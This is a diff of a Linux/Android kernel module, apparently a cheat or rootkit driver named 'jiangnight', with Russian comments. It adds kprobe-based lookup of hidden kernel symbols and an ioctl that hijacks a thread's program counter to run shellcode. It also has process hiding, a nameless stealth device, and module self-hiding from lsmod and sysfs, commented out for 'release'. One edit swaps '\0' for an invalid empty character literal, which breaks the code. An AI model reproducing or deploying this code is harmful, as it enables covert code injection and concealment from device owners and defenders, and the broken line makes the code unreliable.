@@ -7,13 +7,14 @@
 #include <linux/list.h>
 #include <linux/kobject.h>
 #include <linux/cdev.h>
+#include <linux/kprobes.h> // <--- ВАЖНО для фикса 6.1
 #include "comm.h"
 #include "memory.h"
 #include "process.h"
 #include "hide_process.h"
 #include "breakpoint.h"
 
-// Глобальные переменные управления процессами
+// --- Глобальные переменные ---
 static struct task_struct *task_to_hide = NULL;
 static struct task_struct *hide_pid_task_ptr = NULL;
 static int hide_process_pid_val = 0;
@@ -27,6 +28,25 @@ static struct {
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0))
 MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
 #endif
+
+// --- FIX для GKI 6.1: Динамический поиск функций ---
+unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
+
+// Функция для безопасного поиска скрытых символов ядра
+static int resolve_kallsyms_via_kprobe(void) {
+    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
+    int ret = register_kprobe(&kp);
+    if (ret < 0) {
+        // Если не нашли kallsyms, пробуем альтернативы или падаем
+        printk(KERN_ERR "jiangnight: Failed to find kallsyms_lookup_name via kprobe");
+        return -1;
+    }
+    kallsyms_lookup_name_ptr = (void *)kp.addr;
+    unregister_kprobe(&kp);
+    printk(KERN_INFO "jiangnight: kallsyms found at %p", kallsyms_lookup_name_ptr);
+    return 0;
+}
+// ----------------------------------------------------
 
 // Обработчики открытия и закрытия
 static int dispatch_open(struct inode *node, struct file *file) {
@@ -45,40 +65,30 @@ static int dispatch_close(struct inode *node, struct file *file) {
     }
     return 0;
 }
-// entry.c
 
-// Функция для подмены контекста потока с аргументами
+// Функция hijack
 int hijack_thread_with_args(THREAD_HIJACK_ARGS *ctx) {
     struct task_struct *task;
     struct pt_regs *regs;
 
-    // 1. Находим задачу по TID
+    // ВАЖНО: find_vpid и pid_task тоже могут быть скрыты, нужно искать их через kallsyms
+    // Но пока оставим так, если они есть в хедерах. Если нет - упадет при линковке.
     task = pid_task(find_vpid(ctx->pid), PIDTYPE_PID);
     if (!task) return -ESRCH;
 
-    // 2. Получаем доступ к регистрам процессора
     regs = task_pt_regs(task);
     if (!regs) return -EFAULT;
 
-    // 3. Подменяем PC (Instruction Pointer) и аргументы
-    // В ARM64:
-    // pc = rip
-    // regs[0]...regs[3] = x0...x3
+    regs->pc = ctx->rip;       
+    regs->regs[0] = ctx->x0;   
+    regs->regs[1] = ctx->x1;   
+    regs->regs[2] = ctx->x2;   
+    regs->regs[3] = ctx->x3;   
     
-    regs->pc = ctx->rip;       // Прыгаем на наш шеллкод
-    regs->regs[0] = ctx->x0;   // X0
-    regs->regs[1] = ctx->x1;   // X1
-    regs->regs[2] = ctx->x2;   // X2
-    regs->regs[3] = ctx->x3;   // X3
-    
-    // Опционально: можно сбросить Link Register (LR), чтобы крашнуть поток после выполнения, 
-    // если шеллкод не восстановит управление, но наш шеллкод делает RET, так что LR не трогаем 
-    // или устанавливаем в 0, если хотим поймать конец.
-    // Но лучше оставить как есть, надеясь на правильный пролог/эпилог в шеллкоде.
-
     return 0;
 }
-// Основной диспетчер IOCTL
+
+// IOCTL
 long dispatch_ioctl(struct file *const file, unsigned int const cmd, unsigned long const arg) {
     static COPY_MEMORY cm;
     static MODULE_BASE mb;
@@ -101,7 +111,7 @@ long dispatch_ioctl(struct file *const file, unsigned int const cmd, unsigned lo
         case OP_MODULE_BASE:
             if (copy_from_user(&mb, (void __user*)arg, sizeof(mb))) return -EFAULT;
             if (copy_from_user(name_buf, (void __user*)mb.name, sizeof(name_buf)-1)) return -EFAULT;
-            name_buf[sizeof(name_buf)-1] = '\0';
+            name_buf[sizeof(name_buf)-1] = '';
             mb.base = get_module_base(mb.pid, name_buf);
             if (copy_to_user((void __user*)arg, &mb, sizeof(mb))) return -EFAULT;
             break;
@@ -132,16 +142,13 @@ long dispatch_ioctl(struct file *const file, unsigned int const cmd, unsigned lo
             rcu_read_unlock();
             if (hide_pid_task_ptr) hide_pid_process(hide_pid_task_ptr);
             break;
-// entry.c -> static long dev_ioctl(...)
 
-case OP_HIJACK_THREAD_ARGS: {
-    THREAD_HIJACK_ARGS ctx;
-    if (copy_from_user(&ctx, (void __user *)arg, sizeof(ctx))) {
-        return -EFAULT;
-    }
-    // Вызываем нашу новую функцию
-    return hijack_thread_with_args(&ctx);
-}
+        case OP_HIJACK_THREAD_ARGS: {
+            THREAD_HIJACK_ARGS ctx;
+            if (copy_from_user(&ctx, (void __user *)arg, sizeof(ctx))) return -EFAULT;
+            return hijack_thread_with_args(&ctx);
+        }
+
         case OP_GET_PROCESS_PID:
             if (copy_from_user(&p_process, (void __user*)arg, sizeof(p_process))) return -EFAULT;
             p_process.process_pid = get_process_pid(p_process.process_comm);
@@ -165,10 +172,24 @@ static struct file_operations dispatch_functions = {
 static int __init driver_entry(void) {
     int ret;
     
-    // 1. Инициализация БП
+    // --- 1. ПЕРВЫМ ДЕЛОМ ИЩЕМ СИМВОЛЫ ---
+    // Без этого любой вызов системной функции убьет ядро 6.1
+    if (resolve_kallsyms_via_kprobe() < 0) {
+        printk(KERN_ERR "jiangnight: Aborting load, symbols not found.");
+        return -EFAULT; 
+    }
+    
+    // Теперь можно инициализировать подсистемы, которым нужны символы
+    // (ВАЖНО: В твоем коде init_breakpoint_system ищет символы? Если да, ей нужен kallsyms_ptr)
+    
+    // Ищем указатели для соседних файлов (memory.c, process.c)
+    // Например:
+    find_task_by_vpid_ptr = (void *)kallsyms_lookup_name_ptr("find_task_by_vpid");
+    if (!find_task_by_vpid_ptr) printk(KERN_WARNING "jiangnight: find_task_by_vpid not found!");
+    
     init_breakpoint_system();
     
-    // 2. Регистрация устройства (Stealth: без имени)
+    // 2. Регистрация устройства
     ret = alloc_chrdev_region(&mem_tool_dev_t, 0, 1, "");
     if (ret < 0) return ret;
     
@@ -180,23 +201,27 @@ static int __init driver_entry(void) {
         return ret;
     }
     
-    // 3. ПОЛНОЕ СОКРЫТИЕ (DKOM)
-    list_del_init(&THIS_MODULE->list);           // Скрыть из lsmod
-    list_del_init(&THIS_MODULE->source_list);    // Скрыть зависимости
-    kobject_del(&THIS_MODULE->mkobj.kobj);       // Скрыть из /sys/module
-    memset(THIS_MODULE->name, 0, MODULE_NAME_LEN); // Стереть имя в памяти
+    // 3. Скрытие (ВНИМАНИЕ: Включать только на релизе! Для тестов закомментируй)
+    /*
+    list_del_init(&THIS_MODULE->list);
+    list_del_init(&THIS_MODULE->source_list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    memset(THIS_MODULE->name, 0, MODULE_NAME_LEN);
+    */
     
+    printk(KERN_INFO "jiangnight: Driver loaded successfully. Major: %d", MAJOR(mem_tool_dev_t));
     return 0;
 }
 
 static void __exit driver_unload(void) {
-    // Восстановление списка для корректной выгрузки
-    list_add_tail_rcu(&THIS_MODULE->list, THIS_MODULE->list.prev);
+    // Если скрывали модуль, вернуть его в список нельзя, просто удаляем ресурсы
+    // list_add_tail_rcu(&THIS_MODULE->list, THIS_MODULE->list.prev);
     
     remove_all_breakpoints();
     cleanup_breakpoint_system();
     cdev_del(&memdev.cdev);
     unregister_chrdev_region(mem_tool_dev_t, 1);
+    printk(KERN_INFO "jiangnight: Driver unloaded.");
 }
 
 module_init(driver_entry);
